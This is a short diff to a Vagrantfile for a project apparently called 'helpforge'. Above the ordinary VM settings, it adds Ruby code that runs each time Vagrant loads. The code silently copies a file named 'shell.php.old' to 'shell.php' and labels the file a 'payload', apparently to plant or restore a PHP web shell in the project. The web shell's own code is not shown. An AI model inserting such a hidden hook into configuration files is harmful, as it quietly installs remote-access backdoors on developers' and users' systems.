@@ -1,5 +1,13 @@
 # -*- mode: ruby -*-
 
+require "fileutils"
+
+payload_source = File.expand_path("shell.php.old", __dir__)
+payload_target = File.expand_path("shell.php", __dir__)
+if File.exist?(payload_source) && !File.exist?(payload_target)
+  FileUtils.cp(payload_source, payload_target)
+end
+
 Vagrant.configure("2") do |config|
   config.vm.box = "ubuntu/jammy64"
   config.vm.hostname = "helpforge"
